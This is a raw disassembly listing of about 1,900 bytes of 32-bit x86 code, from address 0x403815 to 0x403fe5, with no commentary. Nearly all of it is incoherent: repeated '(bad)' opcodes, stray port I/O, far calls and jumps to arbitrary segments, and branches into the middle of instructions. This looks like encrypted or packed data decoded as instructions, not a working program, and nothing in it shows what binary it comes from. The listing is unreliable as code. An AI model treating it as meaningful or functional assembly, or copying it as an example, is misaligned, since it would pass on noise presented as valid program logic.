  403815:	and    BYTE PTR [ebx],bl
  403817:	(bad)  [ecx+0x21]
  40381a:	push   ebp
  40381b:	ss in  eax,0x1d
  40381e:	add    cl,BYTE PTR [esi]
  403820:	iret   
  403821:	shl    cl,1
  403823:	xchg   esi,eax
  403824:	retf   
  403825:	sbb    BYTE PTR [ebp+esi*1-0x2e],dh
  403829:	mov    ecx,0xc15929a0
  40382e:	mov    edx,0x4055f590
  403833:	aad    0x1d
  403835:	sub    ebp,DWORD PTR ds:0x52ce69b9
  40383b:	ret    0x863a
  40383e:	mov    dh,0x23
  403840:	shr    DWORD PTR [eax-0x83a6e94],1
  403846:	push   edx
  403847:	(bad)  
  403848:	repnz or bl,BYTE PTR [ebx+0x146cdd96]
  40384f:	or     ebx,DWORD PTR ds:0x609feace
  403855:	imul   ebx,DWORD PTR [esi-0x65],0x638b3d63
  40385c:	into   
  40385d:	jle    0x40381e
  40385f:	loop   0x40381a
  403861:	stos   DWORD PTR es:[edi],eax
  403862:	das    
  403863:	mov    ecx,0x40e79974
  403868:	add    ebx,DWORD PTR ds:0xf753fc98
  40386e:	call   0xeeca006c
  403873:	in     eax,dx
  403874:	clc    
  403875:	mov    cl,0xc9
  403877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403878:	fcom   st(4)
  40387a:	jb     0x403875
  40387c:	out    0x59,eax
  40387e:	mov    esp,0x4fe84efe
  403883:	jge    0x4038d0
  403885:	shl    eax,cl
  403887:	cwde   
  403888:	mov    eax,ds:0xfad5f075
  40388d:	ja     0x403882
  40388f:	mov    cl,0x2a
  403891:	es pop edi
  403893:	or     eax,0x982e8b5e
  403898:	mov    ebx,0xeaf466ac
  40389d:	push   0xf3204d01
  4038a2:	ret    0x5d6a
  4038a5:	mov    ah,0xf2
  4038a7:	test   eax,0xef7f4a1f
  4038ac:	(bad)  
  4038ad:	in     eax,dx
  4038ae:	mov    ah,0xc1
  4038b0:	jb     0x403880
  4038b2:	xor    ebp,DWORD PTR [ebx+eax*2+0x2318acf8]
  4038b9:	aad    0xc6
  4038bb:	sbb    ebx,DWORD PTR [eax+0x3]
  4038be:	jnp    0x40393d
  4038c0:	mov    al,BYTE PTR [eax+ecx*1]
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x8d405f3
  4038d5:	pusha  
  4038d6:	loopne 0x403877
  4038d8:	adc    al,0x1d
  4038da:	js     0x403954
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x403878
  4038e1:	adc    eax,0x2bb8fe3d
  4038e6:	sub    eax,0x540072c8
  4038eb:	repz sub eax,0xe55825da
  4038f1:	mov    esp,0x2cfd95dc
  4038f6:	or     DWORD PTR [esi-0x6b],ebp
  4038f9:	jb     0x40394f
  4038fb:	push   ebp
  4038fc:	inc    ebp
  4038fd:	loop   0x403885
  4038ff:	mov    bl,0x26
  403901:	mov    al,0x2d
  403903:	mov    edi,0xbac7fa6c
  403908:	mov    dh,0xe6
  40390a:	sub    eax,0xdce065fd
  40390f:	mov    al,0xe0
  403911:	fidivr DWORD PTR [eax]
  403913:	mov    ch,0xcc
  403915:	mov    eax,0x3f6d69d6
  40391a:	(bad)  
  40391b:	lods   eax,DWORD PTR ds:[esi]
  40391c:	push   ss
  40391d:	jb     0x403974
  40391f:	adc    ch,BYTE PTR [ebx+0x7941498]
  403925:	retf   0x2664
  403928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403929:	xchg   ecx,eax
  40392a:	repnz imul ebp,DWORD PTR [eax],0x22c4a8d6
  403931:	xor    ch,BYTE PTR [edi-0x33]
  403934:	lahf   
  403935:	fadd   st(0),st
  403937:	dec    esi
  403938:	inc    esi
  403939:	cli    
  40393a:	jns    0x40396c
  40393c:	mov    al,ds:0x8259c3cb
  403941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403942:	stos   DWORD PTR es:[edi],eax
  403943:	repnz out dx,eax
  403945:	add    ch,BYTE PTR [esi+0x23]
  403948:	jle    0x40393b
  40394a:	cli    
  40394b:	xor    ebp,DWORD PTR [ebx+edx*4-0x64aeafff]
  403952:	fcomp  QWORD PTR [ebx+0x53]
  403955:	mov    dh,0x15
  403957:	add    eax,0x6a590db2
  40395c:	jbe    0x403974
  40395e:	pop    eax
  40395f:	aam    0x7c
  403961:	test   cl,bh
  403963:	call   0xd12f:0xe616c2d6
  40396a:	mov    edi,0xff706dc3
  40396f:	mov    bh,0xe0
  403971:	mov    edi,0xd2d2dd55
  403976:	jbe    0x403934
  403978:	push   ebx
  403979:	ins    BYTE PTR es:[edi],dx
  40397a:	into   
  40397b:	fld    DWORD PTR [edi-0x1bf7d86a]
  403981:	xchg   esp,eax
  403982:	mov    ds:0x448fa9e4,al
  403987:	jmp    0x403941
  403989:	sbb    al,0xe4
  40398b:	cdq    
  40398c:	adc    BYTE PTR [edx+edx*2+0x5e9c3d69],dl
  403993:	shl    BYTE PTR [edi+0x24107a62],1
  403999:	inc    edi
  40399a:	mov    DWORD PTR [ebx+0x11a652f5],eax
  4039a0:	pop    ebp
  4039a1:	push   ss
  4039a2:	push   edi
  4039a3:	adc    BYTE PTR [eax+eiz*8+0x23953473],ch
  4039aa:	loopne 0x403976
  4039ac:	test   DWORD PTR [ecx+0x76],eax
  4039af:	scas   eax,DWORD PTR es:[edi]
  4039b0:	std    
  4039b1:	mov    esp,0xcb2827bd
  4039b6:	or     DWORD PTR [eax],esi
  4039b8:	mov    edx,0xa3e0b905
  4039bd:	dec    ebp
  4039be:	mov    esi,0xff5bb942
  4039c3:	sub    al,0x16
  4039c5:	cmp    edi,esi
  4039c7:	xchg   ebp,eax
  4039c8:	js     0x40397f
  4039ca:	xchg   edi,eax
  4039cb:	out    0x6d,eax
  4039cd:	(bad)  
  4039ce:	nop
  4039cf:	fs ins DWORD PTR es:[edi],dx
  4039d1:	pop    ds
  4039d2:	dec    edx
  4039d3:	mov    cl,0x4d
  4039d5:	dec    eax
  4039d6:	and    al,0x7b
  4039d9:	xchg   DWORD PTR [ebx-0x60],edi
  4039dc:	std    
  4039dd:	ds lahf 
  4039df:	jp     0x403a56
  4039e1:	cwde   
  4039e2:	idiv   bh
  4039e4:	scas   eax,DWORD PTR es:[edi]
  4039e5:	jge    0x4039dd
  4039e7:	stc    
  4039e8:	mov    fs,WORD PTR [esi+ebx*4+0x6691f701]
  4039ef:	in     al,dx
  4039f0:	sahf   
  4039f1:	popa   
  4039f2:	pop    es
  4039f3:	cmp    ah,BYTE PTR [ebx+ebp*8-0x4c60edb5]
  4039fa:	(bad)  
  4039fb:	jmp    0x4039b4
  4039fd:	add    BYTE PTR [edx+0x63b8e6e7],al
  403a03:	fcomp  DWORD PTR [esp+ecx*1+0x2]
  403a07:	bound  esi,QWORD PTR [edx]
  403a09:	sbb    ebx,DWORD PTR [edi]
  403a0b:	das    
  403a0c:	retf   
  403a0d:	sub    DWORD PTR [edi],edi
  403a0f:	pop    ss
  403a10:	push   ss
  403a11:	pop    ss
  403a12:	cs ret 0xe139
  403a16:	cli    
  403a17:	test   DWORD PTR [ecx+0x4b],0x31142bc4
  403a1e:	xchg   esp,eax
  403a1f:	xchg   esp,eax
  403a20:	les    esp,FWORD PTR [edx-0x6]
  403a23:	or     BYTE PTR [ebx],bh
  403a25:	rol    BYTE PTR [ebx],1
  403a27:	jle    0x4039e3
  403a29:	sbb    dl,bl
  403a2b:	fnstcw WORD PTR [edx-0x96bdc25]
  403a31:	sub    al,0x2e
  403a33:	adc    bh,BYTE PTR [ebx+esi*8-0x72e44188]
  403a3a:	(bad)  
  403a3b:	pusha  
  403a3c:	xor    al,BYTE PTR [edx+esi*4+0x49]
  403a40:	jmp    0x403a98
  403a42:	lods   eax,DWORD PTR ds:[esi]
  403a43:	sbb    DWORD PTR [eax+edi*2],0x6a530e59
  403a4a:	jne    0x403a58
  403a4c:	shl    DWORD PTR [eax+esi*4],0xb7
  403a50:	pop    ss
  403a51:	and    DWORD PTR [esi-0x150feabe],ecx
  403a57:	daa    
  403a58:	lock push ebp
  403a5a:	(bad)  
  403a5c:	clc    
  403a5d:	fsubr  st,st(5)
  403a5f:	out    dx,eax
  403a60:	ret    
  403a61:	mov    DWORD PTR ss:[ecx],eax
  403a64:	sbb    bl,BYTE PTR [edx-0x64]
  403a67:	das    
  403a68:	push   edx
  403a69:	inc    ecx
  403a6a:	into   
  403a6b:	fldcw  WORD PTR [edx-0x41]
  403a6e:	in     al,0x66
  403a70:	mov    ds:0xfd35dfa8,eax
  403a75:	loope  0x403ae5
  403a77:	aas    
  403a78:	(bad)  [esi]
  403a7a:	inc    ebp
  403a7b:	inc    esp
  403a7c:	xchg   edx,eax
  403a7d:	cdq    
  403a7e:	outs   dx,DWORD PTR ds:[esi]
  403a7f:	nop
  403a80:	jl     0x403a2a
  403a82:	push   esi
  403a83:	popa   
  403a84:	in     eax,dx
  403a85:	test   DWORD PTR [ecx+ecx*1-0x6966e008],eax
  403a8c:	dec    eax
  403a8d:	mov    bl,0x5d
  403a8f:	js     0x403a8b
  403a91:	mul    BYTE PTR [edx+0x3324b645]
  403a97:	idiv   BYTE PTR [edi+0x3d]
  403a9a:	scas   eax,DWORD PTR es:[edi]
  403a9b:	cwde   
  403a9c:	mul    DWORD PTR [ebx]
  403a9e:	jne    0x403af9
  403aa0:	(bad)  
  403aa1:	jnp    0x403a6c
  403aa3:	imul   esi,DWORD PTR [ebx+ecx*8+0x4cc1e21c],0xfffffff8
  403aab:	test   BYTE PTR [ebx+0x55],dl
  403aae:	imul   ebp,DWORD PTR [esi+0x7256a644],0x4813538b
  403ab8:	fimul  DWORD PTR [ecx-0x51d9e03e]
  403abe:	or     ah,BYTE PTR [esi+0x25]
  403ac1:	(bad)  
  403ac2:	add    eax,0x9c7091b
  403ac7:	cmp    BYTE PTR [edx+0x7ea51585],bh
  403acd:	into   
  403ace:	mov    cl,0x1b
  403ad0:	mov    dl,0xa1
  403ad2:	mov    edi,0x1e7a852a
  403ad7:	ret    
  403ad8:	test   al,0x94
  403ada:	xlat   BYTE PTR ds:[ebx]
  403adb:	push   cs
  403adc:	jno    0x403a84
  403ade:	adc    DWORD PTR [esi],ecx
  403ae0:	data16 scas al,BYTE PTR es:[edi]
  403ae2:	mov    al,ds:0x6c62f6b1
  403ae7:	loopne 0x403b2d
  403ae9:	adc    edi,esi
  403aeb:	inc    ebp
  403aec:	cmp    al,0x6
  403aee:	stos   DWORD PTR es:[edi],eax
  403aef:	mov    bl,0x79
  403af1:	add    eax,0x9cb6c7ae
  403af6:	lods   al,BYTE PTR ds:[esi]
  403af7:	add    BYTE PTR [ecx],0xb8
  403afa:	mov    WORD PTR [edx+0x5d9624fe],ss
  403b00:	mov    edi,0xcefb2803
  403b05:	xlat   BYTE PTR ds:[ebx]
  403b06:	xchg   ecx,eax
  403b07:	addr16 xchg ebp,eax
  403b09:	ins    BYTE PTR es:[edi],dx
  403b0a:	jmp    0x403b21
  403b0c:	add    dh,BYTE PTR [ecx]
  403b0e:	sbb    eax,0x843f3425
  403b13:	retf   
  403b14:	pop    eax
  403b15:	and    eax,0xbf6a7cec
  403b1a:	push   ss
  403b1b:	lods   al,BYTE PTR ds:[esi]
  403b1c:	stc    
  403b1d:	outs   dx,DWORD PTR ds:[esi]
  403b1e:	cmp    DWORD PTR [ebx-0x4b],esp
  403b21:	add    DWORD PTR [edx+eiz*4-0x6510c2fa],edi
  403b28:	inc    ebp
  403b29:	jg     0x403b93
  403b2b:	clc    
  403b2c:	dec    eax
  403b2d:	cmp    DWORD PTR [esi-0x79bf3003],0xffffffe4
  403b34:	mov    ah,0x87
  403b36:	mov    es,WORD PTR [edi]
  403b38:	jmp    FWORD PTR cs:[edx+eiz*8-0x45]
  403b3d:	jle    0x403b34
  403b3f:	push   DWORD PTR [edx]
  403b41:	shr    BYTE PTR [ebp-0xb],cl
  403b44:	mov    al,ds:0x6481daba
  403b49:	or     dh,BYTE PTR [ebx+0x18eee80d]
  403b4f:	sar    DWORD PTR [ebp+0x1984ba79],cl
  403b55:	(bad)  
  403b56:	iret   
  403b57:	mov    cl,BYTE PTR [eax+0x6908e710]
  403b5d:	adc    bh,bh
  403b5f:	inc    esi
  403b60:	mov    bh,0x36
  403b62:	add    al,0x3b
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	and    ch,BYTE PTR [eax+0x239aa4d3]
  403b85:	js     0x403bff
  403b87:	(bad)  
  403b88:	jle    0x403c02
  403b8a:	js     0x403b0f
  403b8c:	jmp    0x4d9c2ee8
  403b91:	jb     0x403b75
  403b93:	lea    ebp,[eax-0x75]
  403b96:	xor    al,BYTE PTR [esi]
  403b98:	(bad)  
  403b9a:	js     0x403bff
  403b9c:	adc    edi,eax
  403b9e:	test   DWORD PTR [ebx+0x59],0xf758aad8
  403ba5:	xor    cl,BYTE PTR [edx]
  403ba7:	and    ah,al
  403ba9:	imul   esp,DWORD PTR [esp+esi*4-0x6dd5fc18],0xfffffffc
  403bb1:	mov    esi,0x56dcf00d
  403bb6:	dec    ecx
  403bb7:	mov    esi,DWORD PTR [esp+eax*4+0x5e]
  403bbb:	inc    edi
  403bbc:	aaa    
  403bbd:	in     eax,dx
  403bbe:	push   ebx
  403bbf:	cmp    al,0x26
  403bc1:	jnp    0x403c0a
  403bc3:	mov    eax,0xd838c721
  403bc8:	jg     0x403b6b
  403bca:	clc    
  403bcb:	popf   
  403bcc:	outs   dx,DWORD PTR ds:[esi]
  403bcd:	push   esp
  403bce:	dec    esi
  403bcf:	dec    eax
  403bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bd1:	jne    0x403b68
  403bd3:	pop    edx
  403bd4:	push   ds
  403bd5:	xor    BYTE PTR [eax-0x4f4449f6],cl
  403bdb:	push   0xffffff97
  403bdd:	mov    BYTE PTR [eax-0x17],dh
  403be0:	xor    al,0x9c
  403be2:	mov    ebx,0x8f104f6a
  403be7:	aad    0x85
  403be9:	xchg   ebx,eax
  403bea:	mov    ds:0x6f34bb6f,eax
  403bef:	xchg   esi,eax
  403bf0:	inc    esi
  403bf1:	nop
  403bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bf3:	mov    ebp,0x12ecfb66
  403bf8:	mov    BYTE PTR [edi+esi*8],dh
  403bfb:	add    BYTE PTR [edx+edx*4],bl
  403bfe:	aad    0x79
  403c00:	pop    esp
  403c01:	in     eax,0xff
  403c03:	shl    BYTE PTR [ecx+0x5bda4081],1
  403c09:	pop    ebx
  403c0a:	or     DWORD PTR [eax+0x73],esi
  403c0d:	fidiv  DWORD PTR [ecx]
  403c0f:	cmp    edi,DWORD PTR [ecx-0x17]
  403c12:	enter  0xddb9,0x42
  403c16:	ss push edi
  403c18:	mov    cl,0x20
  403c1a:	xchg   ecx,eax
  403c1b:	mov    ch,0x84
  403c1d:	fsubrp st(3),st
  403c1f:	cmp    ecx,esi
  403c21:	mov    ds:0x152a06d4,eax
  403c26:	out    0x87,al
  403c28:	call   0x3b21:0xe839e4ff
  403c2f:	sti    
  403c30:	xlat   BYTE PTR ds:[ebx]
  403c31:	jg     0x403bcf
  403c33:	mov    ds:0xfb74cdb6,al
  403c38:	mov    ch,0x14
  403c3a:	imul   eax,DWORD PTR [ecx],0xb2e2f3e6
  403c40:	sti    
  403c41:	(bad)  
  403c42:	ror    BYTE PTR [bx+di-0x2d],0x47
  403c47:	pop    ebp
  403c48:	jecxz  0x403bca
  403c4a:	pop    ebx
  403c4b:	cmp    BYTE PTR [ebx],bl
  403c4d:	mov    cl,0x61
  403c4f:	daa    
  403c50:	fbstp  TBYTE PTR [ebp+0x5ae1548d]
  403c56:	push   edx
  403c57:	sbb    dh,al
  403c59:	iret   
  403c5a:	mov    eax,ds:0x9e2cd08b
  403c5f:	sbb    bl,ah
  403c61:	lds    edx,FWORD PTR [ebx+0x7b]
  403c64:	and    ebx,edx
  403c66:	aam    0x6a
  403c68:	mov    es,WORD PTR [eax]
  403c6a:	icebp  
  403c6b:	loope  0x403c12
  403c6d:	add    DWORD PTR [edi+0x79],0x6954fb3
  403c74:	repz dec ecx
  403c76:	xchg   ebx,eax
  403c77:	subps  xmm5,XMMWORD PTR [eax+edi*1+0x22a29a63]
  403c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c80:	sbb    BYTE PTR [ebp+0x4e],dl
  403c83:	mov    dl,0xce
  403c85:	ja     0x403ce2
  403c87:	(bad)  
  403c89:	sar    BYTE PTR [edx-0x7b886b02],0xff
  403c90:	jnp    0x403c4e
  403c92:	mov    edi,0xb2d98ecc
  403c97:	adc    eax,0x1778f68b
  403c9c:	in     al,0xca
  403c9e:	ret    0x608b
  403ca1:	mov    DWORD PTR [edi+0x50],esi
  403ca4:	mov    bl,0x1a
  403ca6:	sub    DWORD PTR [esi+0x55ac797],ebx
  403cac:	and    DWORD PTR [eax-0x34],0x44
  403cb0:	sete   BYTE PTR [ebp+esi*1+0x2c9b2fac]
  403cb8:	je     0x403ca0
  403cba:	xlat   BYTE PTR ds:[ebx]
  403cbb:	mov    al,0x12
  403cbd:	inc    eax
  403cbe:	inc    eax
  403cbf:	ret    
  403cc0:	and    DWORD PTR [ebp+eiz*8+0x69],edi
  403cc4:	mov    bh,0x3a
  403cc6:	pusha  
  403cc7:	test   ah,dl
  403cc9:	retf   
  403cca:	pusha  
  403ccb:	fidiv  DWORD PTR [edi-0xb]
  403cce:	and    esp,eax
  403cd0:	sbb    edi,DWORD PTR [ecx-0x1fa594d4]
  403cd6:	pop    edi
  403cd7:	xchg   edi,eax
  403cd8:	mov    al,0xb9
  403cda:	jle    0x403c8e
  403cdc:	jo     0x403cab
  403cde:	mov    edx,?
  403ce0:	xchg   edi,eax
  403ce1:	les    esi,FWORD PTR [edx-0x11]
  403ce4:	fiadd  WORD PTR ds:0xae3a3947
  403cea:	cmp    DWORD PTR [ebp+0x5d],0xffffff96
  403cee:	dec    ecx
  403cef:	xchg   esp,eax
  403cf0:	lea    eax,[ecx-0x65c9550d]
  403cf6:	fld    QWORD PTR [esi+0x21]
  403cf9:	call   0xcc34a06b
  403cfe:	mov    dl,0x17
  403d00:	pop    eax
  403d01:	arpl   WORD PTR ds:0x22df7623,sp
  403d07:	nop
  403d08:	mov    dl,0xa7
  403d0a:	in     al,0x8f
  403d0c:	xchg   BYTE PTR [ebp+0x1b],cl
  403d0f:	inc    ebx
  403d10:	add    bl,al
  403d12:	in     al,0xf3
  403d14:	jae    0x403cf2
  403d16:	sahf   
  403d17:	rcl    DWORD PTR [eax-0x42],1
  403d1a:	fistp  QWORD PTR [ecx-0x1e]
  403d1d:	sbb    eax,ebp
  403d1f:	gs daa 
  403d21:	push   0xffffffaf
  403d23:	test   DWORD PTR [esp+ebp*2-0x2cd2b0d1],edi
  403d2a:	enter  0x670b,0x3f
  403d2e:	push   ecx
  403d2f:	inc    esi
  403d30:	pop    ss
  403d31:	inc    eax
  403d32:	jge    0x403d4f
  403d34:	jbe    0x403da7
  403d36:	cmp    ch,BYTE PTR [edi]
  403d38:	mov    dl,BYTE PTR [eax+0x77]
  403d3b:	test   edi,ecx
  403d3d:	sahf   
  403d3e:	push   ebp
  403d3f:	ins    BYTE PTR es:[edi],dx
  403d40:	mov    al,ds:0x9fd5246c
  403d45:	mov    cl,0x0
  403d47:	daa    
  403d48:	std    
  403d49:	sub    edi,DWORD PTR [edx-0x32]
  403d4c:	jmp    0x403cd1
  403d4e:	pop    edx
  403d4f:	rcr    BYTE PTR [eax+0x58],cl
  403d52:	call   0xa2af:0x4f5165a1
  403d59:	ins    BYTE PTR es:[edi],dx
  403d5a:	inc    ebp
  403d5b:	mov    ebx,0x9ca6c624
  403d60:	out    dx,eax
  403d61:	cmc    
  403d62:	mov    ch,0x43
  403d64:	into   
  403d65:	ret    0x2cae
  403d68:	mov    ebp,0xc0236efe
  403d6d:	add    BYTE PTR [edi],ch
  403d6f:	inc    ebx
  403d70:	lds    ebx,FWORD PTR [edi-0x47]
  403d73:	mov    ebp,0x9a889460
  403d78:	clc    
  403d79:	cmp    bh,ah
  403d7b:	pop    ebp
  403d7c:	pop    edi
  403d7d:	add    eax,0x6c7d7c3e
  403d82:	sahf   
  403d83:	pop    ds
  403d84:	and    DWORD PTR [ecx],0xffffffc3
  403d87:	cli    
  403d88:	ret    
  403d89:	and    ch,BYTE PTR [ebx+0x7658687]
  403d8f:	xchg   ebx,eax
  403d90:	mov    eax,DWORD PTR [edi-0xf84b218]
  403d96:	inc    edi
  403d97:	aam    0x20
  403d99:	jge    0x403d86
  403d9b:	(bad)  
  403d9c:	sbb    ebx,DWORD PTR [esi+0x110d93e5]
  403da2:	mov    ds:0x99201ed7,al
  403da7:	sub    edx,ebx
  403da9:	pop    ecx
  403daa:	popf   
  403dab:	jg     0x403dc4
  403dad:	(bad)  
  403dae:	mov    dl,0xfe
  403db0:	pop    es
  403db1:	(bad)  [edi-0x6f]
  403db4:	std    
  403db5:	loop   0x403d92
  403db7:	in     al,dx
  403db8:	xchg   esp,eax
  403db9:	xchg   edi,eax
  403dba:	mov    edi,0xfce36a3f
  403dbf:	dec    edi
  403dc0:	mov    bh,al
  403dc2:	fcmovbe st,st(0)
  403dc4:	imul   edx,DWORD PTR [eax-0x76],0xffffffbb
  403dc8:	add    ebx,DWORD PTR [edi+0x4e]
  403dcb:	hlt    
  403dcc:	test   eax,0xeed92cad
  403dd1:	jno    0x403df0
  403dd3:	inc    edi
  403dd4:	inc    edx
  403dd5:	in     al,dx
  403dd6:	sbb    esp,ebp
  403dd8:	mov    ebp,0x52d53714
  403ddd:	loop   0x403d9d
  403ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403de0:	rcl    BYTE PTR [eax+eax*4-0x632e69cd],1
  403de7:	mov    eax,0xdf8f1ef6
  403dec:	arpl   si,di
  403dee:	or     al,BYTE PTR [ebp-0x78ecc9b8]
  403df4:	mov    edi,0x5a02418e
  403df9:	(bad)  
  403dfa:	xlat   BYTE PTR ds:[ebx]
  403dfb:	cmp    eax,DWORD PTR [eax]
  403dfd:	sbb    al,0xa5
  403dff:	inc    ebx
  403e00:	adc    eax,0xa2df7126
  403e05:	jno    0x403dd8
  403e07:	arpl   WORD PTR [edi+0x2c],dx
  403e0a:	loop   0x403df5
  403e0c:	add    eax,0x8b08458b
  403e11:	dec    ebp
  403e12:	clc    
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0x91dd8593
  403e30:	jb     0x403dd0
  403e32:	jne    0x403e4c
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403dc6
  403e3c:	or     BYTE PTR [esi+0x5e2d3b85],al
  403e42:	xlat   BYTE PTR ds:[ebx]
  403e43:	xor    BYTE PTR [edi],bh
  403e45:	scas   eax,DWORD PTR es:[edi]
  403e46:	pop    ebp
  403e47:	push   ebp
  403e48:	sbb    dl,BYTE PTR [ecx+0x24]
  403e4b:	outs   dx,BYTE PTR ds:[esi]
  403e4c:	push   eax
  403e4d:	jmp    0x403ddf
  403e4f:	(bad)  
  403e50:	in     eax,0x5d
  403e52:	retf   
  403e53:	mov    ch,0x64
  403e55:	mov    ah,dl
  403e57:	in     eax,dx
  403e58:	out    dx,eax
  403e59:	jmp    0x403ec1
  403e5b:	cmp    DWORD PTR [ebx+edi*8],edi
  403e5e:	cli    
  403e5f:	pushf  
  403e60:	les    esp,FWORD PTR [ebp+0x52]
  403e63:	adc    eax,0x2217acf3
  403e68:	xchg   eax,ecx
  403e6a:	pop    esi
  403e6b:	or     edi,DWORD PTR [ebp-0x48a88ece]
  403e71:	pop    eax
  403e72:	sub    eax,0x8081cd83
  403e77:	pop    edx
  403e78:	mov    esp,DWORD PTR [esi+eiz*2]
  403e7b:	mov    edx,0xae1d7af5
  403e80:	stc    
  403e81:	test   DWORD PTR [ebp+0x2c],ebx
  403e84:	sbb    bh,BYTE PTR ds:0x76339bb4
  403e8a:	ror    eax,1
  403e8c:	push   ebp
  403e8d:	xor    al,0xf6
  403e8f:	sub    dl,al
  403e91:	dec    ecx
  403e92:	inc    ebx
  403e93:	out    dx,al
  403e94:	movsx  edi,WORD PTR [edi-0x65]
  403e98:	cli    
  403e99:	pop    edx
  403e9a:	add    ecx,0xa97fff07
  403ea0:	mov    BYTE PTR [edi+0xeb578b5],al
  403ea6:	sti    
  403ea7:	fwait
  403ea8:	fwait
  403ea9:	or     ah,dh
  403eab:	xchg   ecx,eax
  403eac:	mov    cl,0xf0
  403eae:	popa   
  403eaf:	retf   0xbe9e
  403eb2:	outs   dx,BYTE PTR ds:[esi]
  403eb3:	or     BYTE PTR [esi+0x5f8e994d],0xa8
  403eba:	ret    0x8424
  403ebd:	enter  0xa9fb,0x6c
  403ec1:	sbb    esp,DWORD PTR [esi]
  403ec3:	jbe    0x403e4a
  403ec5:	popa   
  403ec6:	pop    eax
  403ec7:	jge    0x403ed3
  403ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eca:	js     0x403e9e
  403ecc:	cmp    dl,BYTE PTR [esp+eiz*4+0x7a30813b]
  403ed3:	es leave 
  403ed5:	inc    ebp
  403ed6:	xchg   esi,eax
  403ed7:	and    BYTE PTR [ebx-0x17],ah
  403eda:	add    BYTE PTR [ebp+0x66],dh
  403edd:	lahf   
  403ede:	xchg   esi,ebp
  403ee0:	cmp    ah,BYTE PTR ds:0xc3ec0ce7
  403ee6:	(bad)  
  403ee7:	in     al,0x51
  403ee9:	ficom  WORD PTR [eax+0x5a]
  403eec:	and    DWORD PTR ds:0xf9867925,0xdcc03b20
  403ef6:	jmp    0xcc6e:0xfa05aa92
  403efd:	mov    al,0xfd
  403eff:	pop    esp
  403f00:	jp     0x403ee3
  403f02:	pop    es
  403f03:	cmp    eax,0x6f6d13fc
  403f08:	sub    eax,0x19e52a27
  403f0d:	int    0xeb
  403f0f:	in     al,dx
  403f10:	jl     0x6a86b414
  403f16:	ror    BYTE PTR [edx+0x69],0x1c
  403f1a:	inc    eax
  403f1b:	and    bh,bl
  403f1d:	sbb    eax,0x995e83b7
  403f22:	pop    edx
  403f23:	fldcw  WORD PTR [ebx+0x58be15b2]
  403f29:	xor    DWORD PTR [ecx+0x2a8d5957],eax
  403f2f:	jmp    0xacd9:0x9079607b
  403f36:	mov    ds,WORD PTR ss:[eax]
  403f39:	test   BYTE PTR [edi-0x1a],ah
  403f3c:	(bad)  
  403f3e:	pop    esp
  403f3f:	cli    
  403f40:	dec    edx
  403f41:	in     al,dx
  403f42:	shl    bh,1
  403f44:	jbe    0x403f75
  403f46:	test   BYTE PTR [ebp-0x460125ec],ch
  403f4c:	mov    ds:0xd15dd3ee,eax
  403f51:	pop    ss
  403f52:	xor    DWORD PTR [ecx+0x1f],esi
  403f55:	(bad)  
  403f56:	cdq    
  403f57:	pop    esp
  403f58:	sub    ch,BYTE PTR [edx+0x1c9dba71]
  403f5e:	pop    ss
  403f5f:	adc    DWORD PTR [ebx+ecx*2+0x34],ebp
  403f63:	push   edi
  403f64:	dec    ebp
  403f65:	ss cld 
  403f67:	shl    DWORD PTR [eax-0x46],1
  403f6a:	icebp  
  403f6b:	and    ebx,DWORD PTR [edx+0x13]
  403f6e:	xor    eax,0xea97afc4
  403f73:	fild   WORD PTR [ecx-0x7b]
  403f76:	xchg   ebp,eax
  403f77:	call   0x11ed:0x3cc0e068
  403f7e:	push   esp
  403f7f:	pop    ecx
  403f80:	push   eax
  403f81:	cld    
  403f82:	js     0x403f45
  403f84:	sub    al,0xf5
  403f86:	mov    al,0xfa
  403f88:	sbb    al,0x3f
  403f8a:	adc    BYTE PTR [edx],bh
  403f8c:	fmul   QWORD PTR [ebp-0x80]
  403f8f:	or     ah,BYTE PTR [edi*2+0x3796b387]
  403f96:	cmc    
  403f97:	sti    
  403f98:	nop
  403f99:	jecxz  0x403f6d
  403f9b:	sahf   
  403f9c:	cmp    eax,DWORD PTR [eax-0x5d]
  403f9f:	retf   0xa424
  403fa2:	(bad)  
  403fa3:	jne    0x403fdd
  403fa5:	push   0x12019a79
  403faa:	mov    es,ebp
  403fac:	mov    dh,0x50
  403fae:	dec    esp
  403faf:	push   esi
  403fb0:	call   0x4231:0xe750aa26
  403fb7:	lods   al,BYTE PTR ds:[esi]
  403fb8:	sbb    al,0x73
  403fba:	(bad)  
  403fbb:	in     eax,dx
  403fbc:	imul   ebx,edx,0xffffffea
  403fbf:	pop    esp
  403fc0:	out    dx,eax
  403fc1:	mov    edi,0xda9037ec
  403fc6:	cmp    ah,BYTE PTR [edx]
  403fc8:	pop    ecx
  403fc9:	cmp    eax,0x59e20115
  403fce:	pop    eax
  403fcf:	setle  BYTE PTR [edx]
  403fd2:	in     al,dx
  403fd3:	pusha  
  403fd4:	imul   BYTE PTR ds:0x1f5b
  403fd9:	loop   0x403fe3
  403fdb:	add    al,0xf
  403fdd:	push   cs
  403fde:	std    
  403fdf:	dec    ebx
  403fe0:	cmc    
  403fe1:	pushf  
  403fe2:	sbb    ebx,edi
  403fe4:	push   ecx
  403fe5:	jg     0x403fa5
